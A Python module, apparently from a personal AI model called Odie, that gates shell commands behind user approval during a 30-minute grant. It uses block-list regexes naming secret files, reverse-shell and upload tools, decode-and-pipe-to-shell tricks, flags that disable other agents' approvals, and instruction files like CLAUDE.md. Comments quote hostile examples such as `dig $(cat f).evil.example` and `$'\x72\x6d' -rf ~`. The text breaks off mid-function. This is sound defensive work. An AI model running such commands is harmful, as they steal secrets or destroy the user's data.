"""'Allow for 30 min' for run_shell: one tap lets shell commands in the same conversation run
without asking, for GRANT_MINUTES. Commands that read secrets, delete or stop things, send data out, or write outside
/tmp, Odie's workspace and the user's vault always ask anyway. Inline code (python3 -c, a script fed to python3 from a
heredoc) runs under the pass unless its own text reads secrets, deletes or sends data out (23 Oct 2026, the user's
choice: on their own Mac that's a fair trade). Text a command only writes to a file (a heredoc fed to cat) is data,
never read as commands. A New chat is a new conversation, so it starts without a grant.

The check is ADK's require_confirmation predicate: it gets the tool's arguments and tool_context.
"""
from __future__ import annotations

import json
import os
import posixpath
import re
import shlex
import sys
from collections.abc import Callable
from datetime import datetime, timedelta
from pathlib import Path
from typing import Any
from urllib.parse import unquote, urlsplit

from odie import approvals_mode
from odie.agent.context import session_id_of
from odie.store.db import Store

GRANT_MINUTES = 30

_RULES: list[tuple[str, re.Pattern[str]]] = [
    ("switches off another agent's approvals", re.compile(
        r"--yolo\b|--dangerously[\w-]*|--skip[\w-]*permissions|--no[\w-]*(approval|confirm)[\w-]*|--auto[\w-]*approve")),
    ("reads secrets", re.compile(
        r"\.env\b|\.netrc|\.ssh\b|id_rsa|id_ed25519|\.pem\b|keychain|security\s+find-|_PAT\b|_KEY\b|_TOKEN\b|SECRET|"
        r"PASSWORD|passwd|credential|auth\.json|token\.json|client_secret|\.(zshrc|zshenv|zprofile|bashrc|bash_profile|profile)\b|"
        r"\.aws\b|\.npmrc|\.pypirc|\.gnupg|\.kube\b|\.docker/config|hosts\.yml|\.gitconfig|cookies|"
        r"\.(zsh_history|bash_history|python_history|node_repl_history|lesshst)\b|HISTFILE|"
        r"(^|[;&|(]\s*)(env|printenv)\b", re.IGNORECASE)),

    ("deletes or stops something", re.compile(
        r"(^|[;&|(`]\s*|\s)(rm|rmdir|kill|pkill|killall|sudo|chmod|chown|dd|mkfs|shutdown|reboot|launchctl|truncate|"
        r"shred|mv|crontab|trash|diskutil)\b|\bgit\s+(push|reset|clean|rebase|checkout\s+--)|"
        # every push, past git's own options too (git -C x push --force, git push origin :old): it can replace or
        # delete what is on the other side (18 Nov 2026)
        r"\bgit\b[^|;&\n]*\spush\b|"
        r"\bfind\b[^|;&\n]*\s-delete\b|\b(uninstall|prune)\b|"
        r"\bos\.(remove|unlink|rmdir|kill)\b|\bshutil\.(rmtree|move)\b|\.unlink\(|\.rmdir\(|"
        r"\.(rm|rmSync|unlinkSync|rmdirSync)\(|\bsubprocess\b|\bos\.system\b|child_process|"
        # os.system reached another way (random._os.system("id")) and helpers that run a command (17 Nov 2026 review)
        r"\.(system|popen|spawn\w*|posix_spawn\w*|exec[lv]p?e?)\s*\(\s*[^)\s]|_get_command_stdout|"
        # a DELETE sent anywhere, this computer too (it deletes a local model): curl -X DELETE, wget --method=DELETE
        r"\b(curl|wget)\b[^|;&\n]*(-[a-zA-Z]*X\s*(?i:delete)\b|--request\s+(?i:delete)\b|--method[=\s]+(?i:delete)\b)|"
        r"(^|[;&|(]\s*)(http|https|xh|xhs)\s+[^|;&\n]*\b(?i:delete)\b|"
        # cloud and container tools that delete or stop (18 Nov 2026): aws ec2 terminate-instances, terraform destroy,
        # kubectl delete, docker stop, docker compose down
        r"\b(aws|gcloud|gsutil|az|doctl|kubectl|helm|terraform|tofu|pulumi|supabase|heroku|flyctl|fly|vercel|netlify|firebase|"
        r"wrangler)\b[^|;&\n]*\s(delete[\w-]*|destroy|terminate[\w-]*|rb|remove[\w-]*|apps:destroy|drain)\b|"
        r"\b(docker|podman)\b[^|;&\n]*\s(stop|kill|rmi?|down|restart)\b")),
    ("sends data out", re.compile(
        r"\bcurl\b[^|;]*(-[a-zA-Z]*X\s*(POST|PUT|PATCH|DELETE)|--request\s+(POST|PUT|PATCH|DELETE)|--data|--json|"
        r"\s-[a-zA-Z]*[dFTK](\s|\S)|--form|--upload|--config)|\bwget\b[^|;]*(--post|--body|--method)|"
        r"\b(scp|ssh|ftp|sftp|nc|ncat|sendmail|telnet|socat)\b|\bosascript\b[\s\S]*\bsend\b|\bshortcuts\s+run\b|\brsync\b[^|;]*\S+:|"
        r"\bnpm\s+publish\b|\bgh\s+(pr|issue|release)\s+create\b|\bmail\s+-s\b|"
        r"\brequests\.(post|put|patch|delete)\b|\bhttpx\.(post|put|patch|delete)\b|\bsmtplib\b|"
        r"method\s*:\s*['\"](?i:post|put|patch|delete)|"  # fetch takes the method in any case
        # The other ways to send (17 Nov 2026 review): git and gh to another host, Python's urllib with data or a
        # Request, http.client, aiohttp, sockets, node's http.request and a fetch with a body, httpie and xh.
        r"\bgit\b[^|;&\n]*\s(push|send-email)\b|\bgit\b[^|;&\n]*\bremote\s+(add|set-url)\b|"
        r"\bgh\s+(repo\s+(create|fork)|gist\s+create)\b|"
        r"\burlopen\s*\([^)]*,|\bRequest\s*\(|\bhttp\.client\b|\bHTTPS?Connection\b|\baiohttp\b|\burllib3\b|"
        r"\bsocket\.(socket|create_connection)\b|\bhttps?\.request\s*\(|\bbody\s*:\s*[^\s,}]|"
        r"(^|[;&|(]\s*)(http|https|xh|xhs)\s+[^|;&\n]*(\b(?i:post|put|patch|delete)\b|\s[\w.@-]+:?=\S*|\s(-f|--form|--raw)\b)|"
        # Publishing, deploying, cloud tools that write, and opening this computer to the network (18 Nov 2026): docker
        # push, twine upload, cargo/poetry/uv publish, hf upload, a hosting tool (vercel deploys by default), aws s3 cp,
        # kubectl apply, terraform apply (and their deletes: a request sent to delete there), python3 -m http.server, ngrok,
        # tailscale funnel.
        r"\bdocker\s+(push|login)\b|\b(twine|gem)\s+(upload|push)\b|\b(cargo|poetry|uv|pdm|hatch|flit|yarn|pnpm|bun)\s+publish\b|"
        r"\b(hf|huggingface-cli)\s+upload\w*\b|(?<![\w./-])(vercel|netlify|firebase|wrangler|flyctl|fly|railway|surge|heroku)(?=\s|$)|"
        r"\b(aws|gcloud|gsutil|az|doctl|kubectl|helm|terraform|tofu|pulumi|supabase)\b[^|;&\n]*\s(cp|mv|sync|rsync|put[\w-]*|"
        r"create[\w-]*|update[\w-]*|set[\w-]*|apply|deploy|publish|push|upload|invoke|send[\w-]*|run|exec|ssh|scp|login|import|"
        r"replace|patch|scale|rollout|install|upgrade|up|delete[\w-]*|destroy|terminate[\w-]*|remove[\w-]*|rb|drain)\b|"
        r"\bhttp\.server\b|(?<![\w./-])(ngrok|cloudflared|localtunnel)(?=\s|$)|\btailscale\s+(funnel|serve|file)\b")),
    # An address built at run time carries whatever was put into it: curl 'https://x/?d='$(cat f), wget "$URL$DATA",
    # requests.get(base + secret), urlopen(f"...{key}"). Only a fixed address is a plain read.
    # A name looked up or opened carries it too: dig $(cat f).evil.example, open 'https://x/?d='$(cat f).
    ("sends data out (an address built from other text)", re.compile(
        r"\b(curl|wget|xh|aria2c|nc|openssl\s+s_client|dig|nslookup|host|ping)\b[^|;&\n]*(\$\(|`|\$\{?[A-Za-z_])|"
        r"\bgit\s+(clone|fetch|pull|ls-remote|submodule\s+add)\b[^|;&\n]*(\$\(|`|\$\{?[A-Za-z_])|"
        r"\bopen\s+['\"]?https?://[^|;&\n]*(\$\(|`|\$\{?[A-Za-z_])|"
        r"\b(requests\.(get|head)|httpx\.(get|head)|urlopen|urlretrieve|fetch|axios\.get|http\.get|https\.get)\s*\([^)]*"
        r"(\+|\bf['\"]|\.format\(|%\s*\(|\$\{|`)")),
    # Text that is data until it's decoded or piped: `echo <base64> | base64 -d | zsh` shows no command until it runs.
    # Piping into a reader (xargs grep, python3 -m json.tool) and sourcing a venv's activate are ordinary work, not text
    # run as commands; a shell given a substitution (`zsh -c "$(…)"`, `bash <(…)`) is. The pipe counts however the
    # shell is named: `| /bin/sh`, `| X=1 bash`, `| PYTHONINSPECT=1 python3 -c 'pass'` (17 Nov 2026).
    ("runs text as commands", re.compile(
        r"\|\s*(sudo\s+)?(\w+=\S*\s+|(command|builtin|nice|nohup|time|env)\s+)*(\S*/)?"
        r"(sh|bash|zsh|dash|fish|ksh|python3?(?!\s+-m\s+json\.tool\b)|node|ruby|perl|osascript|"
        r"xargs(?!\s+(grep|wc|ls|cat|head|tail|echo|basename|dirname|stat|file|sort|uniq)\b)|source|eval|exec)\b|"
        r"\b(sh|bash|zsh|dash|fish|ksh)\s+(-\w+\s+)*(-c\s+[\"']?\$\(|<\()|"
        r"\b(eval|exec)\s+[\"'$`(]|\bsource\s+(?!\S*/activate\b)\S|(^|[;&|(]\s*)\.\s+(?!\S*/activate\b)\S|"
        r"\bbase64\b[^|;\n]*(\s-[dD]\b|--decode)|\bxxd\s+-r|\bopenssl\s+(enc\s+-d|base64\s+-d)|\buudecode\b|"
        r"\bexec\(|__import__\(|\bnew\s+Function\(|\bvm\.run")),
    # What the owner's choice lets inline code do stops at writing files it couldn't write from the shell (unsafe_write
    # sees only > redirections): python3 -c "open(p, 'w')" is a write like any other.
    ("writes a file from code", re.compile(
        r"\bopen\s*\([^,)]*,\s*(mode\s*=\s*)?['\"][rb]*[wax+][rwaxb+]*['\"]|\bopen\s*\([^)]*mode\s*=\s*['\"][rb]*[wax+]|\.write_(text|bytes)\(|\bwriteFile(Sync)?\(|\bappendFile(Sync)?\(|"
        r"\bfs\.\w*[wW]rite|\bFile\.(write|open)\(|\bIO\.write\(|\bplistlib\.dump|"
        r"\bshutil\.(copy|copyfile|copytree|copy2)\b|\bos\.(rename|replace|symlink|link)\b|\bPath\([^)]*\)\.(rename|replace|symlink_to)")),
    # Things that run again later, or at login: a command that ends now can't be read later.
    ("sets something to run later or at login", re.compile(
        r"LaunchAgents|LaunchDaemons|loginwindow|login\s+item|\bdefaults\s+write\b|\bat\s+now|\bcron\b|\bsystemctl\b|"
        r"/etc/(rc|profile|paths|hosts|sudoers)|\bscreen\s+-dm|"
        r"\btmux\s+new\b|"
        r"\bgit\b[^|;&\n]*\bconfig\b[^|;&\n]*--(global|system)\b", re.IGNORECASE)),  # a pager or alias run later
    # Installing a package runs its install scripts: npm's postinstall, pip's setup.py, brew's formula.
    ("installs software (runs its install scripts)", re.compile(
        r"\b(npm|pnpm|yarn|bun)\s+(i|install|add|ci|up|update|upgrade|exec|x)\b|\bnpx\b|\bpip3?\s+(install|download)\b|"
        r"\buv\s+(pip\s+install|add|sync|tool\s+(install|run))\b|\buv\s+run\b[^|;&\n]*--with\b|\buvx\b|\bpipx\b|\bbrew\s+(install|upgrade|tap|reinstall)\b|"
        r"\bgem\s+install\b|\bcargo\s+install\b|\bgo\s+(install|get|run)\b|\bconda\s+install\b|\bport\s+install\b|"
        r"\bcurl\b[^|;\n]*\|\s*(sh|bash|zsh)|\binstaller\s+-pkg|\bopen\s+\S+\.(dmg|pkg|app)\b|"
        r"\b(docker|podman)\s+(run|pull|build|compose\s+up)\b")),  # fetches an image and runs it (18 Nov 2026)
    ("edits files in place", re.compile(r"\b(sed|perl)\s+(-\w*\s+)*-i|\btee\b")),
]
# Odie's own home (settings, chats, keys, the audit log, the live copy it runs from), except the workspace it writes
# in anyway: ~/.odie/assistant.db -> matches; $ODIE_HOME/data/workspace/x -> not; ~/.odie/workspace -> not.
# The workspace is excluded only as a whole word (workspace-old is not it) and only when the path doesn't climb back
# out with `..`. The Mac's disk ignores case, so the rule does too: ~/.ODIE/data/Assistant.db is Odie's database.
_ODIE_HOME = re.compile(r"(\.odie\b|\{ODIE_HOME\}|ODIE_HOME\b(?!\}))(?!/(data/)?workspace(?![\w-])(?![^\s;&|]*/\.\.))|"
                        r"\b(assistant|sessions|odie-index)\.db\b", re.IGNORECASE)


def touches_odie_home(text: str) -> bool:
    """Whether a command names Odie's own files outside its workspace, in any case: `sqlite3 ~/.odie/assistant.db ...`
    -> True; `cat ~/.ODIE/mcp.json` -> True; `cat $ODIE_HOME/data/keys.json` -> True; `cat ~/.odie/workspace/../data/keys.json` -> True; `ls ~/.odie/workspace`
    -> False; `ls ${ODIE_HOME}/data/workspace/x` -> False; `ls ~/Downloads` -> False."""
    return bool(_ODIE_HOME.search(text))


# A path into a hidden folder or file under the home folder (~/.ssh, $HOME/.config, /Users/me/.zshrc), as the shell
# sees it before globbing.
_HIDDEN_PATH = re.compile(r"(~|\$HOME|\$\{HOME\}|/Users/[^/\s'\"]+|/home/[^/\s'\"]+)/\.[^\s;&|<>]*")
_GLOBBED = re.compile(r"[?*\[\]{}]|\$\(|`|\$\{?[A-Za-z_]")  # a pattern or a substitution: the real name is decided at run time
# A path part that starts with a dot and holds a pattern: .od?e, .o*e, .[a-z]*, .x{a,b}.
_DOT_GLOB = re.compile(r"(?:^|(?<=[\s/=:({,]))\.[^\s/;&|<>]*?[*?\[{]")
_ONE_OF = re.compile(r"\[(.)\]")  # [v]: a glob that matches exactly that one character
_ESCAPED_SEPARATOR = re.compile(r"\\[|;&]")
_SQUEEZE = re.compile(r"\$(?=['\"])|[\\'\"?*]")  # quotes (ANSI-C $'…' too), backslashes and one-character globs that spell a word around a rule
# A redirect and the word it writes to: `> f`, `>> f`, `2>/dev/null`, `>| f` (past noclobber), `&> f`, `>&f` (a file,
# unlike `>&2`, one stream into another); the word may hold quotes or a backslash-escaped space ("my notes", my\ notes).
_REDIRECT = re.compile(r"(\d*|&)>(>|\|)?\s*(&(?:\d+|-)(?![^\s;|<>])|&?(?:'[^']*'|\"[^\"]*\"|\\.|[^\s;&|<>\\'\"])+)")
_HEREDOC = re.compile(r"<<-?\s*(['\"]?)(\w+)\1")
_INTERPRETER = re.compile(r"\b(python3?|node|ruby|perl|osascript|bash|sh|zsh|deno|bun)\b")
_SEGMENT = re.compile(r"&&|\|\||;|\n")
_CD = re.compile(r"^\s*cd\s+(.+?)\s*$")
_ALWAYS_SAFE = ("/dev/null", "/tmp", "/private/tmp")


def split_heredocs(command: str) -> tuple[str, str]:
    """The command's own shell text, and the code an interpreter reads from its heredocs. A heredoc fed to cat is the
    file's words, in neither: `cat > a.md <<'EOF'\nrm this\nEOF` -> ("cat > a.md <<'EOF'", "");
    `python3 - <<'EOF'\nimport os\nEOF` -> ("python3 - <<'EOF'", "import os")."""
    lines = command.split("\n")
    shell = []
    code = []
    i = 0
    while i < len(lines):
        line = lines[i]
        shell.append(line)
        i += 1
        heredoc = _HEREDOC.search(line)
        if heredoc is None:
            continue
        end = heredoc.group(2)
        body = []
        while i < len(lines) and lines[i].strip() != end:
            body.append(lines[i])
            i += 1
        i += 1  # the line that ends it
        fed_to = line[:heredoc.start()]
        if _INTERPRETER.search(fed_to):
            code.extend(body)
    return "\n".join(shell), "\n".join(code)


def _unquoted(text: str) -> str:
    if len(text) >= 2 and text[0] == text[-1] and text[0] in "'\"":
        return text[1:-1]
    return text


def _expanded(path: str, here: str) -> str:
    """A path as the shell would find it: ~ and $HOME made the home folder, a relative one taken from `here`, links
    followed: ("~/vault/a.md", any) -> the vault's real folder + "/a.md"; ("b.py", "/tmp") -> "/private/tmp/b.py"."""
    path = _unquoted(path).replace("\\ ", " ").replace("$HOME", "~").replace("${HOME}", "~")
    path = os.path.expanduser(path)
    if not os.path.isabs(path):
        path = os.path.join(here, path)
    return os.path.realpath(path)


def is_safe_place(path: str, safe_dirs: tuple[str, ...]) -> bool:
    """Whether a file written there needs no tap under a pass: /tmp, /dev/null, or inside one of `safe_dirs` (Odie's
    workspace, the user's vault) but not in a hidden folder of theirs (the vault's .obsidian holds plugins that run).
    Both sides are compared by their real paths, links followed and case ignored (the Mac's disk ignores it), so the
    vault reached by its iCloud path is the vault saved as ~/vault. "/private/tmp/b.py" -> True;
    "<vault>/Stories/cast.md" -> True; "<vault>/.obsidian/plugins/x/main.js" -> False; "~/notes.txt" -> False."""
    for place in _ALWAYS_SAFE:
        if _inside(path, place) or _inside(path, os.path.realpath(place)):
            return True
    for place in safe_dirs:
        real_place = os.path.realpath(os.path.expanduser(place))  # ~/vault too
        if not _inside(path, real_place):
            continue
        below = _parts_under(path.lower(), real_place.lower()) or []
        if not any(part.startswith(".") for part in below):
            return True
    return False


def quoted(text: str) -> set[int]:
    """The positions inside quotes, where a ">" is words, not a redirect: 'echo "a > b" > f' -> the positions of
    a > b; a backslash-escaped quote inside double quotes stays inside."""
    inside = set()
    quote = ""
    escaped = False
    for i, char in enumerate(text):
        if quote:
            if escaped:
                escaped = False
            elif char == "\\" and quote == '"':
                escaped = True
            elif char == quote:
                quote = ""
                continue
            inside.add(i)
        elif char in "'\"":
            quote = char
    return inside


def segment_spans(shell: str) -> list[tuple[int, int]]:
    """Where each segment of the shell text starts and ends (see segments): "cd /tmp && ls" -> [(0, 8), (10, 13)]."""
    words = quoted(shell)
    out = []
    start = 0
    for cut in _SEGMENT.finditer(shell):
        if cut.start() in words:
            continue
        out.append((start, cut.start()))
        start = cut.end()
    out.append((start, len(shell)))
    return out


def segments(shell: str) -> list[str]:
    """The shell text cut at &&, ||, ; and line ends, but never inside quotes (an awk program's ";", an AppleScript
    over several lines): "cd /tmp && awk '{a; b}' f" -> ["cd /tmp ", " awk '{a; b}' f"]."""
    return [shell[start:end] for start, end in segment_spans(shell)]


OUTSIDE = "writes a file outside /tmp"
REPLACES = "replaces a file"
_STREAM = re.compile(r"&(\d+|-)")  # 2>&1, >&-: one stream into another (or closed), no file


def shell_word(word: str) -> str | None:
    """A word as the shell hands it on, its quotes and escapes taken out, or None when it can't be read as one word:
    `'my notes.md'` -> "my notes.md"; `my\\ notes.md` -> "my notes.md"; `~/"a b"/c` -> "~/a b/c"; `'open` -> None."""
    try:
        got = shlex.split(word)
    except ValueError:
        return None
    if len(got) != 1:
        return None
    return got[0]


def write_reason(shell: str, safe_dirs: tuple[str, ...], cwd: str | None, smart: bool = False,
                 odie_dirs: tuple[str, ...] = (), code: str = "") -> str | None:
    """Why the shell text's writes (>, >>, >|, &>) need a tap, following its cd's (piece_folders), or None when they
    don't. A write into a safe place (/tmp, the workspace, the vault) never asks. Careful's pass: any other place ->
    "writes a file outside /tmp". Smart also lets a new note or output, or an append to one, in an ordinary folder under
    the home run (ordinary_write); replacing a file there -> "replaces a file". A ">" inside quotes is words; a relative
    path in a folder the text can't name (after `popd`, `cd -`, a cd in a subshell) asks.
      `cd /tmp && cat > b.py` -> None;  `echo hi > ~/notes.txt` -> "writes a file outside /tmp";
      Smart, `echo hi > ~/work/notes/new.md` -> None;  Smart, `echo hi > ~/work/notes/old.md` (it exists) ->
      "replaces a file";  `echo "a > b"` -> None;  `popd; echo hi > x.md` -> "writes a file outside /tmp"."""
    may_create = _MAKES_FOLDERS_OR_LINKS.search(f"{shell}\n{code}") is not None  # heredoc code may make one too
    for start, end, here in piece_folders(shell, cwd):
        segment = shell[start:end]
        words = quoted(segment)
        for redirect in _REDIRECT.finditer(segment):
            if redirect.start() in words:
                continue  # a ">" inside quotes: words (an arrow, a comparison), not a file
            target = redirect.group(3)
            if _STREAM.fullmatch(target):
                continue
            target = target.removeprefix("&")  # >&file writes the file
            name = shell_word(target)
            if name is None:
                return OUTSIDE
            path = _resolved(name, here)
            if path is None or read_as_instructions(name):
                return OUTSIDE
            if is_safe_place(path, safe_dirs):
                continue
            if not smart:
                return OUTSIDE
            appending = redirect.group(2) == ">"
            why = ordinary_write(name, here, appending, odie_dirs, may_create)
            if why is not None:
                return why
    return None


def _resolved(name: str, here: str | None) -> str | None:
    """A name as the shell finds it (_expanded), or None when it is relative and the folder isn't known:
    ("a.md", "/h/work") -> "/h/work/a.md"; ("~/a.md", None) -> "/h/a.md"; ("a.md", None) -> None."""
    absolute = name.startswith(("/", "~", "$HOME", "${HOME}"))
    if here is None and not absolute:
        return None
    return _expanded(name, here or os.path.expanduser("~"))


def unsafe_write(shell: str, safe_dirs: tuple[str, ...], cwd: str | None) -> bool:
    """Whether the shell text writes anywhere but a safe place (write_reason, as Careful's pass reads it):
    `cd /tmp && cat > b.py` -> False; `echo hi > ~/notes.txt` -> True."""
    return write_reason(shell, safe_dirs, cwd) is not None


# A name the shell fills in at run time ($, `, a glob or a brace), or another user's ~ or ~- / ~+.
_DYNAMIC_NAME = re.compile(r"[$`*?\[\]{}]|^~(?!/|$)")
_LEADING_HOME = re.compile(r"^\$(HOME|\{HOME\})(?=/|$)")


def _inside(path: str, place: str) -> bool:
    """Whether a path is the place or inside it, case ignored (the Mac's disk ignores it): ("/h/.odie/app/x",
    "/h/.odie") -> True; ("/h/.ODIE/x", "/h/.odie") -> True; ("/h/.odie", "/h/.odie") -> True; ("/h/.odie-old/x",
    "/h/.odie") -> False."""
    path = path.lower()
    place = place.rstrip("/").lower()
    return path == place or path.startswith(place + "/")


def _parts_under(path: str, home: str) -> list[str] | None:
    """The parts of `path` below `home`, or None when it isn't under it: ("/h/work/a.md", "/h") -> ["work", "a.md"];
    ("/tmp/a", "/h") -> None; ("/h", "/h") -> []."""
    if path == home:
        return []
    if not path.startswith(home.rstrip("/") + "/"):
        return None
    return path[len(home.rstrip("/")) + 1:].split("/")


def in_ordinary_folder(path: str, home: str, odie_dirs: tuple[str, ...]) -> bool:
    """Whether `path` sits in an ordinary folder under the home: a folder below it (not the home itself), no part
    hidden (starting with a dot), not ~/Library (in any case: the Mac's disk ignores case), and not inside one of
    Odie's own folders (`odie_dirs`, also compared ignoring case).
      "/h/work/notes/a.md" -> True;  "/h/a.md" -> False;  "/h/.config/a" -> False;  "/h/work/.git/config" -> False;
      "/h/library/a" -> False;  "/tmp/a" -> False."""
    parts = _parts_under(path, home)
    if parts is None or len(parts) < 2:
        return False
    if any(part.startswith(".") for part in parts):
        return False
    if parts[0].lower() == "library":
        return False
    folded = path.lower()
    for place in odie_dirs:
        place = place.rstrip("/").lower()
        if folded == place or folded.startswith(place + "/"):
            return False
    return True


# Notes and outputs: the only files a Smart write makes or appends to without a tap. A script, a plist, a Makefile or a
# package.json is run later by something else, so writing one still asks.
NOTE_ENDINGS = (".md", ".txt", ".csv", ".tsv", ".log")
# Anything in the command that could make a folder or a link first, so a later write lands somewhere the check can't
# see yet: `ln -s ~/Library/LaunchAgents ~/work/la && cat > ~/work/la/x.plist`.
_MAKES_FOLDERS_OR_LINKS = re.compile(
    r"\b(ln|cp|mv|mkdir|install|rsync|ditto|tar|bsdtar|unzip|gunzip|cpio|pax|hdiutil|mount|patch|xargs)\b|"
    r"\bgit\b[^|;&\n]*\b(checkout|switch|worktree|clone|restore|stash|reset|pull|merge|am|apply)\b|"
    # and from code: node's symlinkSync / mkdirSync, Python's os.symlink, os.makedirs, Path(…).symlink_to, .mkdir(
    r"\b(symlink\w*|link\w*Sync|mkdir\w*|makedirs|mkdtemp\w*|symlink_to|hardlink_to|cpSync|renameSync)\b")
# Files that other tools read as instructions or as what to install, named in any case: writing one asks wherever it
# is, safe places too (an agent reads ~/vault/CLAUDE.md as its orders), in every mode.
_READ_AS_INSTRUCTIONS = re.compile(
    r"^(claude|agents|gemini|conventions)[\w.-]*\.md$|instructions[\w.-]*\.md$|rules|^llms[\w.-]*\.txt$|"
    r"(requirements|constraints)[\w.-]*\.(txt|in)$|^brewfile|\.lock$", re.IGNORECASE)


def read_as_instructions(name: str) -> bool:
    """Whether a file's name says other tools read it as instructions or an install list, so writing it asks wherever
    it is: "CLAUDE.md" -> True; "~/vault/CLAUDE.local.md" -> True; "dev-requirements.txt" -> True; "house-rules.md" ->
    True; "requirements.in" -> True; "llms.txt" -> True; "notes.md" -> False; "README.md" -> False."""
    return _READ_AS_INSTRUCTIONS.search(os.path.basename(name.rstrip("/"))) is not None


def ordinary_write(name: str, here: str | None, appending: bool, odie_dirs: tuple[str, ...],
                   may_create: bool = False) -> str | None:
    """Smart's rule 7: whether a write outside the safe places is still plain, or why it asks. Plain: a new note or
    output (NOTE_ENDINGS), or an append to one, in an ordinary folder under the home (in_ordinary_folder, as written
    and with links followed), in a folder that is already there and reached through no link, with a plain name, and
    nothing in the same command that could make a folder or a link first (`may_create`). Replacing a file asks.
      `> ~/work/notes/new.md` -> None;  `>> ~/work/notes/old.md` -> None;  `> ~/work/notes/old.md` -> "replaces a
      file";  `> ~/work/proj/run.sh` -> "writes a file outside /tmp" (a script);  `> ~/.config/x` -> the same;
      `> ~/work/notes/$(date).md` -> the same;  `> ~/work/new-folder/a.md` -> the same (no such folder yet);
      `> ~/work/link-to-notes/a.md` -> the same (through a link);  `ln -s … && echo > …/a.md` -> the same;
      `>> ~/work/proj/CLAUDE.md` or `requirements.txt` -> the same (read later as instructions)."""
    from_home = _LEADING_HOME.sub("~", name)  # $HOME/x is ~/x, not a name made at run time
    if _DYNAMIC_NAME.search(from_home) or may_create:
        return OUTSIDE
    if not from_home.lower().endswith(NOTE_ENDINGS):
        return OUTSIDE
    if _READ_AS_INSTRUCTIONS.search(os.path.basename(from_home)):
        return OUTSIDE  # CLAUDE.md, AGENTS.md, requirements.txt: read later as instructions or an install list
    written_home = os.path.normpath(os.path.expanduser("~"))
    as_written = _spelled(name, here or written_home)  # no links followed
    real = _expanded(name, here or written_home)
    real_home = os.path.realpath(written_home)
    written_odie = tuple(os.path.normpath(os.path.expanduser(d)) for d in odie_dirs)
    real_odie = tuple(os.path.realpath(d) for d in written_odie)
    if not in_ordinary_folder(as_written, written_home, written_odie):
        return OUTSIDE
    if not in_ordinary_folder(real, real_home, real_odie):
        return OUTSIDE
    if not folder_is_plain(os.path.dirname(as_written), written_home):
        return OUTSIDE
    if appending:
        if os.path.islink(as_written):
            return OUTSIDE
        return None
    if os.path.lexists(as_written) or os.path.exists(real):
        return REPLACES
    return None


def folder_is_plain(folder: str, home: str) -> bool:
    """Whether a folder under the home is already there and reached through no link: every part from the home down
    is a real folder. "/h/work/notes" (there) -> True; "/h/work/new" (not there) -> False; "/h/work/la" (a link to
    ~/Library/LaunchAgents) -> False; "/h/Work/Notes" for /h/work/notes -> True (case ignored)."""
    if not os.path.isdir(folder):
        return False
    written = _parts_under(os.path.normpath(folder).lower(), os.path.normpath(home).lower())
    real = _parts_under(os.path.realpath(folder).lower(), os.path.realpath(home).lower())
    return written is not None and written == real


# ── fewer cards for ordinary work (16 Nov 2026) ──────────────────────────────────────────────────────────────────────
# A morning's PR review asked 7 times: for deleting its own scratch files in /tmp, for `sed 's/\x1b…//'` (stripping
# terminal colours), for "source" inside a grep pattern, for `npx tsc` (the project's own tsc). These say when such
# work is plainly safe; anything they can't read plainly still asks as before.

_SEARCH_TOOL = re.compile(r"\b(grep|egrep|fgrep|rg|ag)\b")
_HEX = re.compile(r"\\x[0-9a-fA-F]{2}")
_HEX_INTO_CODE = re.compile(r"\$'|\$\(|`|\b(eval|exec|awk|gawk|perl|python3?|node|ruby|osascript|sh|bash|zsh|xargs|source)\b")
_DELETE = re.compile(r"^\s*(rm|rmdir|trash)((\s+-[\w-]+)*)((\s+[^\s;&|<>$`(){}\\]+)+)\s*$")
_NPX = re.compile(r"\bnpx\s+([\w.-]+)")
_UVX = re.compile(r"\buvx\s+([\w.-]+)")
_UV_WITH = re.compile(r"\s--with\s+([\w.\[\]-]+)")
# Python tools and libraries a review or a test run fetches by name; an exact name only (no versions, no --from).
KNOWN_PY_TOOLS = frozenset({"ruff", "black", "mypy", "pytest", "pyright", "isort", "flake8", "httpx", "fastapi",
                            "pytest-asyncio", "requests", "uvicorn", "pydantic"})
_CODE_LEAVES_HERE = re.compile(r"""["']\s*[/~]|\.\.|home\(|expanduser|environ|getenv|chdir|\$HOME|os\.path\.join\(\s*["']/""")


def search_patterns_blanked(text: str) -> str:
    r"""The text with the quoted patterns given to grep or rg blanked out: a search pattern is words looked for, never
    run. A double-quoted one holding $( or ` is left as it is (the shell runs that part).
    `grep -n "install\|source" README.md` -> `grep -n "                " README.md`; `ls "source x"` -> unchanged;
    `grep "$(rm -rf ~)" f` -> unchanged."""
    inside = quoted(text)
    out = list(text)
    for tool in _SEARCH_TOOL.finditer(text):
        if tool.start() in inside:
            continue
        i = tool.end()
        while i < len(text):
            if i not in inside and text[i] in "|;&\n":
                break
            if i in inside:
                run_end = i
                while run_end in inside:
                    run_end += 1
                pattern = text[i:run_end]
                runs_something = "$(" in pattern or "`" in pattern
                if not runs_something:
                    for j in range(i, run_end):
                        out[j] = " "
                i = run_end
            i += 1
    return "".join(out)


def hex_spells_code(text: str) -> bool:
    r"""Whether a \x41-style escape could spell a command: it sits in an ANSI-C $'…' string, or the command also has a
    substitution or an interpreter that could run what it spells. Stripping colours is not that.
    `sed 's/\x1b\[[0-9;]*m//g' log` -> False; `$'\x72\x6d' -rf ~` -> True; `perl -e 'system "\x72\x6d x"'` -> True;
    `$(printf '\x72\x6d') -rf ~` -> True; no escape at all -> False."""
    if not _HEX.search(text):
        return False
    return bool(_HEX_INTO_CODE.search(text))


def is_scratch_delete(segment: str, here: str, scratch_dirs: tuple[str, ...]) -> bool:
    """Whether one segment only deletes things inside /tmp or Odie's workspace (`scratch_dirs`), never the place
    itself: plain names only, no $ or substitution, no `..`, no sudo. Paths are taken from `here` (after its cd's).
    `rm -f /tmp/pr12-*.log` -> True; `rm -rf /tmp/pr12-review` -> True; `rm -rf /tmp` -> False (the place itself);
    `rm notes.txt` in ~ -> False; `rm -rf /tmp/$X` -> False; `rm -rf /tmp/../Users/me` -> False;
    `rm /tmp/a ~/b` -> False (one path outside)."""
    got = _DELETE.match(segment)
    if got is None:
        return False
    places = [os.path.realpath(place) for place in (*_ALWAYS_SAFE, *scratch_dirs)]

    def strictly_inside(path: str) -> bool:
        return any(path.startswith(place.rstrip("/") + "/") for place in places)

    for target in got.group(4).split():
        name = _unquoted(target)
        if ".." in name:
            return False
        fixed = _GLOBBED.split(name, maxsplit=1)[0]  # the part before any pattern: "/tmp/pr12-" of "/tmp/pr12-*.log"
        if fixed == name:
            path_ok = strictly_inside(_expanded(name, here))
        elif fixed == "" or fixed.endswith("/"):
            folder = _expanded(fixed or ".", here)
            path_ok = strictly_inside(folder)  # `rm /tmp/*` empties /tmp itself: asks; `rm /tmp/x/*` -> fine
